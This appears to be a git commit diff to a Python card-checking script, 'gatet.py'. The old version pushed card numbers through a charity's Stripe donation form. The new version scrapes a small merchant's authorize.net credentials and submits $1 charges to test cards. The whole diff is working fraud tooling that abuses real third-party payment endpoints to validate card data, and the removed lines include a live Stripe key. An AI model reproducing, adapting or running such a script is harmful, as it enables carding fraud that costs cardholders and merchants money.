3cf6057d8a26d791d65d61689feca4ed8d18cd0e
Rodamuser08 <rodamuser08@gmail.com>
2025-05-24 21:22:10 +0700

    Update gatet.py

--- gatet.py
+++ gatet.py
@@ -15,64 +15,143 @@ def Tele(ccx):
 	random_amount2 = random.randint(1, 99)
 
 	headers = {
-	    'authority': 'api.stripe.com',
-	    'accept': 'application/json',
-	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
-	    'content-type': 'application/x-www-form-urlencoded',
-	    'origin': 'https://js.stripe.com',
-	    'referer': 'https://js.stripe.com/',
+	    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+	    'Accept-Language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+	    'Cache-Control': 'max-age=0',
+	    'Connection': 'keep-alive',
+	    'Referer': 'https://www.google.com/',
+	    'Sec-Fetch-Dest': 'document',
+	    'Sec-Fetch-Mode': 'navigate',
+	    'Sec-Fetch-Site': 'cross-site',
+	    'Sec-Fetch-User': '?1',
+	    'Upgrade-Insecure-Requests': '1',
+	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
 	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
-	    'sec-fetch-dest': 'empty',
-	    'sec-fetch-mode': 'cors',
-	    'sec-fetch-site': 'same-site',
-	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
 	}
 	
-	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F5cceeecc6c%3B+stripe-js-v3%2F5cceeecc6c%3B+card-element&key=pk_live_51P8IPZH1vCzvxZYyDn4BNA1FmPomApUnZyHzE0sM8lo1W85oMSZOUBUhy8wL4VxYob9tY1g7bdInCsnOTztCGtnd00KH92QIUK'
+	response = requests.get('https://www.mfpco.com/orders/gatherInfo.php', headers=headers)
 	
-	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
-	
-	pm = response.json()['id']
+	x_login = re.search(r'name="x_login" value="(.*?)"', response.text).group(1)
+	#print(x_login)
+	x_transaction_key = re.search(r'name="x_transaction_key" value="(.*?)"', response.text).group(1)
+	#print(x_transaction_key)
+	pmt = re.search(r'name="x_fp_sequence" value="(.*?)"', response.text).group(1)
+	#print(pmt)
 	
 	headers = {
-	    'authority': 'community.interestofjustice.org',
-	    'accept': '*/*',
-	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
-	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-	    'origin': 'https://community.interestofjustice.org',
-	    'referer': 'https://community.interestofjustice.org/',
+	    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+	    'Accept-Language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+	    'Cache-Control': 'max-age=0',
+	    'Connection': 'keep-alive',
+	    'Content-Type': 'application/x-www-form-urlencoded',
+	    'Origin': 'https://www.mfpco.com',
+	    'Referer': 'https://www.mfpco.com/orders/gatherInfo.php',
+	    'Sec-Fetch-Dest': 'document',
+	    'Sec-Fetch-Mode': 'navigate',
+	    'Sec-Fetch-Site': 'same-origin',
+	    'Sec-Fetch-User': '?1',
+	    'Upgrade-Insecure-Requests': '1',
+	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
 	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
-	    'sec-fetch-dest': 'empty',
-	    'sec-fetch-mode': 'cors',
-	    'sec-fetch-site': 'same-origin',
-	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
-	    'x-requested-with': 'XMLHttpRequest',
-	}
-	
-	params = {
-	    't': '1747981628337',
 	}
 	
 	data = {
-	    'data': f'__fluent_form_embded_post_id=27&_fluentform_2_fluentformnonce=7a0634d5c7&_wp_http_referer=%2F&names%5Bfirst_name%5D=&names%5Blast_name%5D=&email=rodamuser{random_amount1}{random_amount2}%40gmail.com&country-list=&payment_input_2=Free&payment_input=4&payment_input_custom_4=0.5&payment_method=stripe&email_1=&__stripe_payment_method_id={pm}',
-	    'action': 'fluentform_submit',
-	    'form_id': '2',
+	    'x_login': f'{x_login}',
+	    'x_transaction_key': f'{x_transaction_key}',
+	    'x_fp_hash': '',
+	    'x_fp_sequence': f'{pmt}',
+	    'x_fp_timestamp': '',
+	    'x_type': 'AUTH_CAPTURE',
+	    'x_amount': '0',
+	    'x_version': '3.1',
+	    'x_email': '',
+	    'x_phone': '',
+	    'x_cust_id': '',
+	    'x_delim_data': 'FALSE',
+	    'x_relay_response': 'TRUE',
+	    'x_relay_url': '',
+	    'pmtorderid': f'{pmt}',
+	    'x_invoice_num': f'{pmt}',
+	    'pmt_invoice_num': '1',
+	    'pmt_customer_num': '1',
+	    'pmt_amount': '1',
+	    'x_first_name': 'Rodam',
+	    'x_last_Name': 'User',
+	    'x_address': 'Street 27',
+	    'x_city': 'New York',
+	    'x_state': 'NY',
+	    'x_zip': '10080',
+	    'x_card_num': f'{n}',
+	    'x_exp_date': '',
+	    'expmonth': f'{mm}',
+	    'expyear': f'20{yy}',
+	    'x_card_code': f'{cvc}',
 	}
 	
-	response = requests.post(
-	    'https://community.interestofjustice.org/wp-admin/admin-ajax.php',
-	    params=params,
-	    headers=headers,
-	    data=data,
-	)
+	response = requests.post('https://www.mfpco.com/orders/createANRequest.php', headers=headers, data=data)
 	
-	try:
-		result = re.search(r'"errors":"Stripe Error: (.*?)"', response.text).group(1)
-	except:
-		result = response.text
 	
+	x_fp_hash = re.search(r'value\s*=\s*"([a-fA-F0-9]{32})"', response.text).group(1)
+	#print(x_fp_hash)
+	x_fp_timestamp = re.search(r"x_fp_timestamp'\]\.value\s*=\s*\"(\d{10})\"", response.text).group(1)
+	#print(x_fp_timestamp)
+	
+	headers = {
+	    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+	    'Accept-Language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+	    'Cache-Control': 'max-age=0',
+	    'Connection': 'keep-alive',
+	    'Content-Type': 'application/x-www-form-urlencoded',
+	    'Origin': 'https://www.mfpco.com',
+	    'Referer': 'https://www.mfpco.com/',
+	    'Sec-Fetch-Dest': 'document',
+	    'Sec-Fetch-Mode': 'navigate',
+	    'Sec-Fetch-Site': 'cross-site',
+	    'Upgrade-Insecure-Requests': '1',
+	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
+	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
+	    'sec-ch-ua-mobile': '?1',
+	    'sec-ch-ua-platform': '"Android"',
+	}
+	
+	data = {
+	    'x_login': f'{x_login}',
+	    'x_transaction_key': f'{x_transaction_key}',
+	    'x_fp_hash': f'{x_fp_hash}',
+	    'x_fp_sequence': f'{pmt}',
+	    'x_fp_timestamp': f'{x_fp_timestamp}',
+	    'x_type': 'AUTH_CAPTURE',
+	    'x_amount': '1',
+	    'x_version': '3.1',
+	    'x_email': '',
+	    'x_phone': '',
+	    'x_cust_id': '1',
+	    'x_delim_data': 'FALSE',
+	    'x_relay_response': 'TRUE',
+	    'x_relay_url': 'https://mfpco.com/orders/processANResponse.php',
+	    'pmtorderid': f'{pmt}',
+	    'x_invoice_num': '1',
+	    'pmt_invoice_num': '1',
+	    'pmt_customer_num': '1',
+	    'pmt_amount': '1',
+	    'x_first_name': 'Rodam',
+	    'x_last_Name': 'User',
+	    'x_address': 'Street 27',
+	    'x_city': 'New York',
+	    'x_state': 'NY',
+	    'x_zip': '10080',
+	    'x_card_num': f'{n}',
+	    'x_exp_date': f'{mm}{yy}',
+	    'expmonth': f'{mm}',
+	    'expyear': f'20{yy}',
+	    'x_card_code': f'{cvc}',
+	}
+	
+	response = requests.post('https://secure.authorize.net/gateway/transact.dll', headers=headers, data=data)
+	
+	result = re.search(r'name="x_response_reason_text" value="(.*?)"', response.text).group(1)
 	return (result)
